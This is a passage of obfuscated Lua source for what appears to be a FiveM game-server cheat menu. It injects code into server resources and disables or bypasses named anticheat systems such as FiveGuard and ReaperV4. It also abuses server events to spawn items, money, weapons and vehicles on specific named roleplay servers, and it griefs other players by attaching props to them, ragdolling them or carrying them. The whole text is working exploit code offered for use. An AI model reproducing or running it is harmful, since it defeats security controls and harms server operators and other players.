    ]]);MachoMenuNotification("ReaperV4","ReaperV4 bypass activated!");break;end if ((591 -(562 + 29))==v420) then v421=nil;if (GetResourceState("monitor")=="started") then v421="monitor";elseif (GetResourceState("qb-core")=="started") then v421="qb-core";else v421="ox_inventory";end v420=1 + 0 ;end end end);MachoMenuButton(v154,"Stop All Anticheat Resources",function() local v422=1419 -(374 + 1045) ;local v423;while true do if (v422==(0 + 0)) then v423=nil;if (GetResourceState("monitor")=="started") then v423="monitor";elseif (GetResourceState("qb-core")=="started") then v423="qb-core";else v423="ox_inventory";end v422=2 -1 ;end if ((639 -(448 + 190))==v422) then MachoInjectResource2(NewThreadNs,v423,[[
        print("Stopping all anticheat resources...")
        
        local antiCheatResources = {
            -- FiveGuard
            "FiveGuard", "fiveguard", "FIVEGUARD", "fg", "FG", "FiveGuardAC",
            -- Eagle AC
            "Eagle", "eagle", "EagleAC", "eagle_ac", "EC-AC", "EC_AC", "EC-PANEL", "EC_PANEL",
            -- Reaper
            "ReaperV4", "Reaper", "reaper", "REAPER",
            -- WX
            "wx_anticheat", "wx-ac", "WX-AC", "WX_AC", "WXAntiCheat", "WX_AntiCheat",
            -- Electron
            "ElectronAC", "electron", "ELECTRON",
            -- Fini
            "FiniAC", "fini", "FINI",
            -- WaveShield
            "WaveShield", "waveshield", "WAVESHIELD",
            -- Generic
            "anticheat", "anti-cheat", "ac", "AntiCheat", "ANTICHEAT"
        }
        
        local stopped = 0
        
        for _, res in ipairs(antiCheatResources) do
            if GetResourceState(res) == "started" then
                pcall(StopResource, res)
                pcall(ExecuteCommand, 'stop ' .. res)
                print("Stopped: " .. res)
                stopped = stopped + 1
            end
        end
        
        print("Stopped " .. stopped .. " anticheat resources")
        TriggerEvent('chat:addMessage', { args = { '^2Anticheat Killer:', 'Stopped ' .. stopped .. ' anticheat resources!' } })
    ]]);MachoMenuNotification("Anticheat Killer","Stopping all anticheat resources...");break;end end end);local v165=false;local v166=nil;local v167={};local function v168() v165=false;v166=nil;for v514,v515 in ipairs(v167) do if DoesEntityExist(v515) then DeleteEntity(v515);end end v167={};MachoMenuNotification("Eagle Props","Stopped all prop spawns!");print("[Eagle Props] Stopped and cleaned up all objects");end local function v169() local v424=0 + 0 ;while true do if (v424==1) then MachoMenuNotification("Eagle Props","Prop spawn started on all players!");print("[Eagle Props] Started");break;end if (v424==0) then v165=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        eaglePropsActive = true
        local attachedProps = {}
        local players = GetActivePlayers()
        
        if #players == 0 then
            print("[Eagle Props] No players found")
            return
        end
        
        print("[Eagle Props] Starting object attachment on " .. #players .. " players")
        
        for _, pid in ipairs(players) do
            if not eaglePropsActive then break end
            
            local ped = GetPlayerPed(pid)
            local name = GetPlayerName(pid)
            
            if DoesEntityExist(ped) and not IsEntityDead(ped) then
                print("[Eagle Props] Processing: " .. name .. " (ID: " .. pid .. ")")
                
                -- List of objects to attach
                local attachModels = {
                    "prop_windmill_01",
                    "prop_roadcone01a",
                    "prop_barrel_01a",
                    "prop_tyre_01a",
                    "prop_ball_01a",
                    "v_res_tre_stool",
                    "prop_cs_dildo",
                    "prop_cash_crate_01",
                    "prop_med_jet_01",
                    "prop_rub_carpart_01",
                    "prop_skip_01a",
                    "prop_air_bag_01a"
                }
                
                for _, modelName in ipairs(attachModels) do
                    if not eaglePropsActive then break end
                    
                    local model = GetHashKey(modelName)
                    RequestModel(model)
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < 50 do
                        Citizen.Wait(10)
                        attempts = attempts + 1
                    end
                    
                    if HasModelLoaded(model) then
                        local offsetX = math.random(-10, 10) / 10
                        local offsetY = math.random(-10, 10) / 10
                        local offsetZ = math.random(0, 20) / 10
                        
                        local coords = GetEntityCoords(ped)
                        local obj = CreateObject(model, coords.x, coords.y, coords.z, true, true, true)
                        
                        if DoesEntityExist(obj) then
                            AttachEntityToEntity(obj, ped, 0, offsetX, offsetY, offsetZ, 0.0, 0.0, 0.0, false, false, true, false, 2, true)
                            table.insert(attachedProps, obj)
                            
                            -- Store globally for cleanup
                            _G.eagleAttachedProps = attachedProps
                            
                            print("[Eagle Props] Attached " .. modelName .. " to " .. name)
                            
                            -- Spin each object
                            CreateThread(function()
                                while eaglePropsActive and DoesEntityExist(obj) do
                                    local rot = GetEntityRotation(obj)
                                    SetEntityRotation(obj, rot.x, rot.y, rot.z + 5.0, 0, true)
                                    Citizen.Wait(10)
                                end
                            end)
                        end
                    else
                        print("[Eagle Props] Failed to load model: " .. modelName)
                    end
                    Citizen.Wait(200)
                end
            else
                print("[Eagle Props] Player " .. name .. " is invalid or dead")
            end
            Citizen.Wait(500)
        end
        
        print("[Eagle Props] All objects attached. They will auto-cleanup when stopped.")
    ]]);v424=1 + 0 ;end end end MachoMenuButton(v154,"Toggle Eagle Props",function() if v165 then v168();else v169();end end);MachoMenuButton(v154,"Stop Eagle Props",function() v168();end);MachoMenuButton(v154,"Eagle Props Status",function() if v165 then local v585=0 + 0 ;local v586;while true do if ((3 -2)==v585) then print("[Eagle Props] Active - "   .. v586   .. " objects attached" );break;end if (v585==0) then v586= #v167;MachoMenuNotification("Eagle Props","Active! "   .. v586   .. " objects attached" );v585=2 -1 ;end end else MachoMenuNotification("Eagle Props","Inactive");print("[Eagle Props] Inactive");end end);print("[Eagle Props] Toggle added to AntiCheatSection!");MachoMenuButton(v10,"Toggle Admin Names",function() local v425=1494 -(1307 + 187) ;while true do if ((0 -0)==v425) then TriggerEvent("qb-admin:client:toggleNames");MachoMenuNotification("Admin","Toggling admin names...");break;end end end);MachoMenuButton(v10,"Toggle Admin Blips",function() TriggerEvent("qb-admin:client:toggleBlips");MachoMenuNotification("Admin","Toggling admin blips...");end);local v16=false;local v170=false;local v171=false;local v172=false;local function v173() local v426=0 -0 ;while true do if (v426==0) then v16= not v16;if v16 then MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            
            -- Sound effect
            PlaySoundFromEntity(-1, "ent_amb_elec_crackle", playerPed, 0, false, 0)
            
            -- Electricity effect (original txsrc particle)
            CreateThread(function()
                -- Load core asset
                RequestNamedPtfxAsset("core")
                while not HasNamedPtfxAssetLoaded("core") do
                    Wait(1)
                end
                
                UseParticleFxAsset("core")
                
                -- Original txsrc electricity effect
                local particle = StartParticleFxLoopedOnEntity(
                    "ent_dst_elec_fire_sp",
                    playerPed,
                    0.0, 0.0, 0.0,
                    0.0, 0.0, 0.0,
                    1.75,
                    false, false, false
                )
                
                -- Wait 1.5 seconds (same as txsrc)
                Wait(1500)
                
                -- Stop
                if particle then 
                    StopParticleFxLooped(particle, true) 
                end
                
                RemoveNamedPtfxAsset("core")
            end)
        ]]);TriggerEvent("txcl:setPlayerMode","noclip");MachoMenuNotification("TX System","Noclip active! Electricity effect added!");else local v846=0 -0 ;while true do if ((683 -(232 + 451))==v846) then TriggerEvent("txcl:setPlayerMode","none");MachoMenuNotification("TX System","Noclip deactivated!");break;end end end break;end end end MachoMenuCheckbox(v10,"Tx Noclip - Safe",function() v173();end,function() if v16 then v173();end end);MachoMenuText(v10,"TX NOCLIP BIND KEYS");MachoMenuCheckbox(v10,"Enable F2 Key",function() local v427=0 + 0 ;while true do if (v427==(0 + 0)) then v170=true;MachoMenuNotification("TX Bind","F2 key enabled for TX Noclip");v427=565 -(510 + 54) ;end if ((1 -0)==v427) then print("[TX Bind] F2 key enabled for TX Noclip");break;end end end,function() v170=false;MachoMenuNotification("TX Bind","F2 key disabled for TX Noclip");print("[TX Bind] F2 key disabled for TX Noclip");end);MachoMenuCheckbox(v10,"Enable F5 Key",function() local v428=0;while true do if (v428==0) then v171=true;MachoMenuNotification("TX Bind","F5 key enabled for TX Noclip");v428=37 -(13 + 23) ;end if (v428==(1 -0)) then print("[TX Bind] F5 key enabled for TX Noclip");break;end end end,function() v171=false;MachoMenuNotification("TX Bind","F5 key disabled for TX Noclip");print("[TX Bind] F5 key disabled for TX Noclip");end);MachoMenuCheckbox(v10,"Enable F7 Key",function() local v429=0;while true do if (v429==0) then v172=true;MachoMenuNotification("TX Bind","F7 key enabled for TX Noclip");v429=1 -0 ;end if (v429==(1 -0)) then print("[TX Bind] F7 key enabled for TX Noclip");break;end end end,function() v172=false;MachoMenuNotification("TX Bind","F7 key disabled for TX Noclip");print("[TX Bind] F7 key disabled for TX Noclip");end);MachoOnKeyDown(function(v430) local v431=1088 -(830 + 258) ;while true do if ((3 -2)==v431) then if (v172 and (v430==(74 + 44))) then v173();MachoMenuNotification("TX Bind","TX Noclip toggled via F7");print("[TX Bind] TX Noclip toggled via F7");end break;end if (0==v431) then if (v170 and (v430==(97 + 16))) then v173();MachoMenuNotification("TX Bind","TX Noclip toggled via F2");print("[TX Bind] TX Noclip toggled via F2");end if (v171 and (v430==(1557 -(860 + 581)))) then local v847=0;while true do if (v847==(3 -2)) then print("[TX Bind] TX Noclip toggled via F5");break;end if (0==v847) then v173();MachoMenuNotification("TX Bind","TX Noclip toggled via F5");v847=1 + 0 ;end end end v431=242 -(237 + 4) ;end end end);MachoMenuButton(v10,"TX Bind Status",function() local v432="F2: "   .. ((v170 and "ON") or "OFF")   .. " | F5: "   .. ((v171 and "ON") or "OFF")   .. " | F7: "   .. ((v172 and "ON") or "OFF") ;MachoMenuNotification("TX Bind Status",v432);print("[TX Bind] Status: "   .. v432 );end);MachoMenuButton(v10,"Enable All TX Binds",function() v170=true;v171=true;v172=true;MachoMenuNotification("TX Bind","All keys enabled! F2, F5, F7");print("[TX Bind] All keys enabled!");end);MachoMenuButton(v10,"Disable All TX Binds",function() v170=false;v171=false;v172=false;MachoMenuNotification("TX Bind","All keys disabled!");print("[TX Bind] All keys disabled!");end);print("[TX Bind] Individual bind system loaded (F2, F5, F7)");MachoMenuCheckbox(v10,"Tx Godmode - Safe",function() local v433=0 -0 ;while true do if (v433==(2 -1)) then MachoMenuNotification("TX Features","Godmode active!");break;end if (v433==(0 -0)) then v17=true;TriggerEvent("txcl:setPlayerMode","godmode");v433=1 + 0 ;end end end,function() v17=false;TriggerEvent("txcl:setPlayerMode","none");MachoMenuNotification("TX Features","Godmode deactivated!");end);MachoMenuCheckbox(v10,"Tx SuperJump - Safe",function() local v434=0;while true do if (v434==1) then MachoMenuNotification("TX Features","SuperJump active!");break;end if (v434==0) then v18=true;TriggerEvent("txcl:setPlayerMode","superjump");v434=1 + 0 ;end end end,function() local v435=0 -0 ;while true do if (v435==0) then v18=false;TriggerEvent("txcl:setPlayerMode","none");v435=1;end if (v435==(1 + 0)) then MachoMenuNotification("TX Features","SuperJump deactivated!");break;end end end);MachoMenuButton(v10,"TX TP Waypoint - Safe",function() TriggerEvent("txcl:tpToWaypoint");end);MachoMenuButton(v9,"Revive - Safe",function() TriggerEvent("hospital:client:Revive",PlayerPedId());end);MachoMenuButton(v10,"Tx Car Fix - Safe",function() TriggerEvent("txcl:vehicle:fix");end);MachoMenuButton(v10,"Tx Wild Attack - Risky",function() TriggerEvent("txcl:wildAttack");end);MachoMenuButton(v10,"Tx Car Boost - Risky",function() TriggerEvent("txcl:vehicle:boost");end);MachoMenuText(v9,"Weapon Spawn");MachoMenuButton(v9,"RPG Spawn - Risky",function() GiveWeaponToPed(PlayerPedId(),"weapon_rpg",136 + 114 ,false,true);end);MachoMenuButton(v9,"Pistol Spawn - Safe",function() GiveWeaponToPed(PlayerPedId(),"weapon_pistol",1676 -(85 + 1341) ,false,true);end);MachoMenuButton(v9,"Glock 19 Spawn - Safe",function() GiveWeaponToPed(PlayerPedId(),"weapon_g19",426 -176 ,false,true);end);MachoMenuButton(v9,"Remove Current Weapon",function() RemoveWeaponFromPed(PlayerPedId(),GetSelectedPedWeapon(PlayerPedId()));end);Citizen.CreateThread(function() local v436=GetConvar("sv_hostname","N/A");local v437=GetConvar("sv_endpoint","N/A");if (v436=="N/A") then v436=GetCurrentServerEndpoint() or "Unknown Server" ;end if (KeysBin=="wex") then local v587=MachoMenuAddTab(v4,"Wex Roleplay");local v588=MachoMenuGroup(v587,"Wex Roleplay",v3,0,(v1.x-v3) + (423 -273) ,v1.y);local v589=MachoMenuInputbox(v588,"Item to Spawn","...");MachoMenuButton(v588,"Spawn Item",function() local v723=0;local v724;while true do if (v723==(372 -(45 + 327))) then v724={item=MachoMenuGetInputbox(v589),amount=1 -0 };if (v724.item and (v724.item~="")) then MachoInjectResource("m-Tequila",string.format([[
                    TriggerServerEvent('m-Tequila:server:CraftAlcoholic', "%s", %d)
                ]],v724.item,v724.amount));else MachoMenuNotification("Error","Please enter a valid item name!");end break;end end end);end if (v436:find("Edge Roleplay") or v436:find("edge")) then local v590=502 -(444 + 58) ;local v591;local v592;local v593;local v594;while true do if (v590==(0 + 0)) then v591=MachoMenuAddTab(v4,"Edge Roleplay");v592=MachoMenuGroup(v591,"Item Exploit",v3,9,(v1.x-v3) + 150 ,52 + 248 );v590=1;end if (v590==(1 + 0)) then v593=MachoMenuInputbox(v592,"Item Code","e.g., weapon_g19");v594=MachoMenuInputbox(v592,"Amount","e.g., 1");v590=5 -3 ;end if (v590==(1734 -(64 + 1668))) then MachoMenuButton(v592,"Give Item",function() local v885=1973 -(1227 + 746) ;local v886;local v887;while true do if (v885==(0 -0)) then v886=MachoMenuGetInputbox(v593);v887=tonumber(MachoMenuGetInputbox(v594));v885=1;end if (v885==1) then if (v886 and (v886~="") and v887 and (v887>(0 -0))) then MachoInjectResource("monitor",string.format([[
                    TriggerServerEvent('horizon_paymentsystem:giveItem', "%s", %d)
                ]],v886,v887));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end end end);break;end end end if v436:find("Boz RP") then local v595=494 -(415 + 79) ;local v596;local v597;local v598;local v599;while true do if (v595==(1 + 1)) then MachoMenuButton(v597,"Start/Stop Money Exploit",function() local v888=491 -(142 + 349) ;while true do if (v888==(0 + 0)) then v598= not v598;if v598 then local v964=0;while true do if (v964==(0 -0)) then v599=false;MachoInjectResource("monitor",[[
                    Citizen.CreateThread(function()
                        while true do
                            if shouldStop then
                                break
                            end
                            TriggerServerEvent('akela_karpuz:process')
                            TriggerServerEvent('akela_karpuz:take')
                            Citizen.Wait(20)
                        end
                    end)
                ]]);break;end end else local v965=0 + 0 ;while true do if (v965==0) then v599=true;MachoInjectResource("monitor",[[
                    shouldStop = true
                    TriggerEvent('chat:addMessage', { args = { '^2Exploit System:', 'Money exploit stopped!' } })
                ]]);break;end end end break;end end end);break;end if (v595==(1 + 0)) then v598=false;v599=false;v595=5 -3 ;end if (v595==(1864 -(1710 + 154))) then v596=MachoMenuAddTab(v4,"Boz RP Exploit");v597=MachoMenuGroup(v596,"Boz RP Money Glitch",v3,318 -(200 + 118) ,(v1.x-v3) + 150 ,v1.y);v595=1 + 0 ;end end end if v436:find("Quasar Roleplay") then local v600=0 -0 ;local v601;local v602;local v603;local v604;while true do if (v600==1) then v603=MachoMenuInputbox(v602,"Item Name","...");v604=MachoMenuInputbox(v602,"Amount","1");v600=2 -0 ;end if (0==v600) then v601=MachoMenuAddTab(v4,"Quasar Roleplay");v602=MachoMenuGroup(v601,"Quasar Roleplay",v3,0 + 0 ,(v1.x-v3) + 149 + 1 ,v1.y);v600=1;end if ((2 + 0)==v600) then MachoMenuButton(v602,"Add Item",function() local v889={item=MachoMenuGetInputbox(v603),amount=tonumber(MachoMenuGetInputbox(v604)) or (1 + 0) };if (v889.item and (v889.item~="") and (v889.amount>(0 -0))) then MachoInjectResource("any",string.format([[
                    TriggerServerEvent('sedat:Server:AddItem', "%s", %d)
                ]],v889.item,v889.amount,v889.item,v889.amount));else MachoMenuNotification("Error","Please enter a valid item name and amount!");end end);break;end end end if v436:find("Valoria Roleplay") then local v605=1250 -(363 + 887) ;local v606;local v607;local v608;local v609;local v610;local v611;local v612;while true do if (v605==2) then MachoMenuButton(v607,"Send Vehicle",function() local v890=0 -0 ;local v891;while true do if (v890==0) then v891=MachoMenuGetInputbox(v610);if (v891~="") then MachoInjectResource("CL-PoliceGarageV2",string.format([[ 
                    local QBCore = exports['monitor']:GetCoreObject() 
                    local veh = GetVehiclePedIsIn(PlayerPedId(), false) 
                    TriggerServerEvent("CL-PoliceGarageV2:AddData", "vehiclepurchased", "%s", QBCore.Functions.GetVehicleProperties(veh), "police") 
                ]],v891,v891));else MachoMenuNotification("Error","Vehicle name cannot be empty!");end break;end end end);MachoMenuText(v607,"Item Exploit");v611=MachoMenuInputbox(v607,"Item Code","e.g., sandwich");v612=MachoMenuInputbox(v607,"Amount","e.g., 3");v605=3;end if (v605==(0 -0)) then v606=MachoMenuAddTab(v4,"Valoria Roleplay");v607=MachoMenuGroup(v606,"Valoria Roleplay",v3,0 + 0 ,(v1.x-v3) + 150 ,v1.y);MachoMenuText(v607,"Money Exploit");v608=MachoMenuInputbox(v607,"Payment Type","Only Cash or Bank");v605=2 -1 ;end if (v605==(3 + 0)) then MachoMenuButton(v607,"Give Item",function() local v892=1664 -(674 + 990) ;local v893;local v894;while true do if (v892==(1 + 0)) then if ((v893~="") and (v894>(0 + 0))) then MachoInjectResource("drones",string.format([[
                    TriggerServerEvent("Drones:Back", -1, "%s", %d)
                ]],v893,v894,v893,v894));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end if (v892==(0 -0)) then v893=MachoMenuGetInputbox(v611);v894=tonumber(MachoMenuGetInputbox(v612)) or (1056 -(507 + 548)) ;v892=838 -(289 + 548) ;end end end);break;end if (v605==(1819 -(821 + 997))) then v609=MachoMenuInputbox(v607,"Money Amount","e.g., 10000");MachoMenuButton(v607,"Spawn Money",function() local v895=255 -(195 + 60) ;local v896;while true do if ((0 + 0)==v895) then v896={paymentType=MachoMenuGetInputbox(v608),refund=tonumber(MachoMenuGetInputbox(v609)) or (12612 -(251 + 1250)) ,playerId=GetPlayerServerId(PlayerId())};if (v896.paymentType and (v896.paymentType~="") and (v896.refund>(0 -0))) then MachoInjectResource("monitor",string.format([[ 
                    TriggerServerEvent('CL-PoliceGarageV2:RefundRent', '%s', %d, %d, 'policejob') 
                ]],v896.paymentType,v896.refund,v896.playerId));else MachoMenuNotification("Error","Please enter a valid payment type and amount!");end break;end end end);MachoMenuText(v607,"Vehicle Data Exploit");v610=MachoMenuInputbox(v607,"Vehicle Name","e.g., sultan");v605=2 + 0 ;end end end if v436:find("AriaV") then local v613=1032 -(809 + 223) ;local v614;local v615;local v616;local v617;local v618;while true do if (v613==(3 -0)) then MachoMenuButton(v615,"Ragdoll Player",function() local v897=0 -0 ;local v898;while true do if (v897==(0 -0)) then v898=tonumber(MachoMenuGetInputbox(v618));if (v898 and (v898>(0 + 0))) then MachoInjectResource("monitor",string.format([[ 
                    TriggerServerEvent("tackle:server:TacklePlayer", %d) 
                ]],v898));MachoMenuNotification("Lena Roleplay","Ragdoll sent! Target ID: "   .. v898 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);break;end if ((2 + 0)==v613) then MachoMenuButton(v615,"Item Exploit",function() local v899=0;local v900;local v901;while true do if (v899==0) then v900=MachoMenuGetInputbox(v616);v901=tonumber(MachoMenuGetInputbox(v617));v899=618 -(14 + 603) ;end if (1==v899) then if ( not v900 or (v900=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v901 or (v901<=(129 -(118 + 11)))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end v899=2;end if (v899==2) then MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                for itemName, _ in pairs(items) do
                    local items = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(items) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                              
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v900,v901));MachoMenuNotification("Success","Item exploit sent!");break;end end end);v618=MachoMenuInputbox(v615,"Target Player ID","Example: 123");v613=1 + 2 ;end if (v613==(1 + 0)) then v616=MachoMenuInputbox(v615,"Code Name","Example: item_code");v617=MachoMenuInputbox(v615,"Code Amount","Example: 3");v613=5 -3 ;end if (v613==(949 -(551 + 398))) then v614=MachoMenuAddTab(v4,"AriaV");v615=MachoMenuGroup(v614,"AriaV",v3,0,(v1.x-v3) + 150 ,v1.y);v613=1 + 0 ;end end end if v436:find("Rena Roleplay") then local v619=0 + 0 ;local v620;local v621;local v622;while true do if (v619==(1 + 0)) then MachoMenuText(v621,"Money Exploit");v622=MachoMenuDropDown(v621,"Drop Down",function(v902) if (v902==0) then MachoInjectResource("monitor",[[
                        local data = {
                            probability = { b = 540, a = 380 },
                            type = "weapon",
                            name = "weapon_g17",
                            count = 1,
                            sound = "mystery"
                        }

                        TriggerServerEvent('luckywheel:give', data)
                    ]]);elseif (v902==(7 -5)) then MachoInjectResource("monitor",[[
                        TriggerServerEvent('qb-trashsearch:server:searchedTrash', 889090, false, "weapon_bottle")
                    ]]);elseif (v902==(9 -5)) then else MachoMenuNotification("Error","This option not found!");end end,"G17","Bottle","Toast");break;end if (v619==(0 + 0)) then v620=MachoMenuAddTab(v4,"Rena Roleplay");v621=MachoMenuGroup(v620,"Rena Roleplay",v3,0 -0 ,(v1.x-v3) + 42 + 108 ,150);v619=1;end end end if v436:find("Atlantis Roleplay") then local v623=89 -(40 + 49) ;local v624;local v625;local v626;local v627;local v628;local v629;local v630;while true do if (v623==0) then v624=MachoMenuAddTab(v4,"Atlantis Roleplay");v625=MachoMenuGroup(v624,"Atlantis Roleplay Item",v3,9,(v1.x-v3) + 150 ,v1.y);v623=3 -2 ;end if (3==v623) then v629=MachoMenuInputbox(v625,"Phone Number","Example: 123-456-7890");v630=MachoMenuInputbox(v625,"Message","Text to appear in yellow pages");v623=494 -(99 + 391) ;end if (v623==(1 + 0)) then v626=MachoMenuInputbox(v625,"Code Name","Example: item_code");v627=MachoMenuInputbox(v625,"Code Amount","Example: 3");v623=2;end if (v623==(17 -13)) then MachoMenuButton(v625,"Send to Yellow Pages",function() local v903=0 -0 ;local v904;local v905;local v906;while true do if (v903==(3 + 0)) then MachoInjectResource("gksphone",string.format([[
                TriggerServerEvent('gksphone:yellow_postPagess', "%s", "%s", "%s", "", "bartender")
            ]],v904,v905,v906));MachoMenuNotification("Success","Sent to yellow pages!");break;end if (v903==(5 -3)) then if ( not v905 or (v905=="")) then local v966=1604 -(1032 + 572) ;while true do if (v966==0) then MachoMenuNotification("Error","Please enter a phone number!");return;end end end if ( not v906 or (v906=="")) then local v967=0;while true do if (0==v967) then MachoMenuNotification("Error","Please enter a message!");return;end end end v903=420 -(203 + 214) ;end if (v903==1) then v906=MachoMenuGetInputbox(v630);if ( not v904 or (v904=="")) then MachoMenuNotification("Error","Please enter a name!");return;end v903=1819 -(568 + 1249) ;end if (0==v903) then v904=MachoMenuGetInputbox(v628);v905=MachoMenuGetInputbox(v629);v903=1 + 0 ;end end end);break;end if ((4 -2)==v623) then MachoMenuButton(v625,"Item Exploit",function() local v907=0;local v908;local v909;while true do if (v907==(0 -0)) then v908=MachoMenuGetInputbox(v626);v909=tonumber(MachoMenuGetInputbox(v627));v907=1;end if (2==v907) then MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                if not items then
                    TriggerEvent('QBCore:Notify', 'ox_inventory:Items() function returned nil. Please check ox_inventory resource.', 'error')
                    return
                end

                for itemName, _ in pairs(items) do
                    local slots = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(slots or {}) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                            
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v908,v909));break;end if (v907==(1307 -(913 + 393))) then if ( not v908 or (v908=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v909 or (v909<=(0 -0))) then local v968=0 -0 ;while true do if (0==v968) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end v907=2;end end end);v628=MachoMenuInputbox(v625,"Name","Name to appear in yellow pages");v623=3;end end end if v436:find("XX Gun") then local v631=MachoMenuAddTab(v4,"XX Gun");local v632=MachoMenuGroup(v631,"XX Gun Item",v3,419 -(269 + 141) ,(v1.x-v3) + (333 -183) ,v1.y);local v633=MachoMenuInputbox(v632,"Item Code","e.g., sandwich");local v634=MachoMenuInputbox(v632,"Amount","e.g., 3");MachoMenuButton(v632,"Give Item",function() local v725=0;local v726;local v727;while true do if ((1982 -(362 + 1619))==v725) then if ((v726~="") and (v727>(1625 -(950 + 675)))) then MachoInjectResource("any",string.format([[
                    local core = exports['monitor']:GetCoreObject()
                    local item = { name = "%s" }
                    local amount = %d
    
                    for i = amount, 1, -1 do
                        TriggerServerEvent('Drones:Back', item, core.Key)
                    end
                ]],v726,v727));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end if (v725==(0 + 0)) then v726=MachoMenuGetInputbox(v633);v727=tonumber(MachoMenuGetInputbox(v634)) or 1 ;v725=1180 -(216 + 963) ;end end end);end if v436:find("Owl Roleplay") then local v635=MachoMenuAddTab(v4,"Owl Roleplay");local v636=MachoMenuGroup(v635,"Owl Roleplay Item",v3,9,(v1.x-v3) + (1437 -(485 + 802)) ,v1.y);local v637=MachoMenuInputbox(v636,"Code Name","Example: item_code");local v638=MachoMenuInputbox(v636,"Code Amount","Example: 3");MachoMenuButton(v636,"Item Exploit",function() local v728=MachoMenuGetInputbox(v637);local v729=tonumber(MachoMenuGetInputbox(v638));if ( not v728 or (v728=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v729 or (v729<=(559 -(432 + 127)))) then local v848=0;while true do if (v848==(1073 -(1065 + 8))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end MachoInjectResource("t1-rgbcontroller",string.format([[
                TriggerServerEvent('t1-rgbcontroller:sv:AddItem', '%s', %d)
            ]],v728,v729));MachoMenuNotification("Success",string.format("%d %s added!",v729,v728));end);local v639=MachoMenuInputbox(v636,"Target Player ID","Example: 123");MachoMenuButton(v636,"Carry Player",function() local v730=tonumber(MachoMenuGetInputbox(v639));if ( not v730 or (v730<=0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end MachoInjectResource("t1-cr",string.format([[
                TriggerServerEvent('t1-cr:tasi-target-server', %d)
            ]],v730));MachoMenuNotification("Success",string.format("Player ID %d carried!",v730));end);end if v436:find("Light Roleplay") then local v640=MachoMenuAddTab(v4,"Light Roleplay");local v641=MachoMenuGroup(v640,"Light Roleplay Item",v3,5 + 4 ,(v1.x-v3) + (1751 -(635 + 966)) ,v1.y);local v642=MachoMenuInputbox(v641,"Code Name","Example: item_code");local v643=MachoMenuInputbox(v641,"Code Amount","Example: 3");MachoMenuButton(v641,"Item Exploit",function() local v731=MachoMenuGetInputbox(v642);local v732=tonumber(MachoMenuGetInputbox(v643));if ( not v731 or (v731=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v732 or (v732<=(0 + 0))) then local v849=42 -(5 + 37) ;while true do if (v849==(0 -0)) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                for itemName, _ in pairs(items) do
                    local items = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(items) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                              
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v731,v732));end);local v644=MachoMenuInputbox(v641,"Name","Name to appear in yellow pages");local v645=MachoMenuInputbox(v641,"Phone Number","Example: 123-456-7890");local v646=MachoMenuInputbox(v641,"Message","Text to appear in yellow pages");MachoMenuButton(v641,"Send to Yellow Pages",function() local v733=0 + 0 ;local v734;local v735;local v736;while true do if (v733==3) then MachoInjectResource("gksphone",string.format([[
                TriggerServerEvent('gksphone:yellow_postPagess', "%s", "%s", "%s", "", "bartender")
